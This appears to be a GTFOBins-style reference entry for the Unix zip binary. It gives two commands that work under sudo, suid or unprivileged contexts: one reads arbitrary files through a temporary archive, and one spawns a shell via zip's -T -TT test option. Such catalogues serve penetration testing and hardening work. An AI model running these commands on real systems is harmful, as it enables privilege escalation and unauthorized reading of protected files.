---
type: gtfobin
name: zip
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# zip

## file-read

```bash
zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
```
**Contexts:** sudo, suid, unprivileged
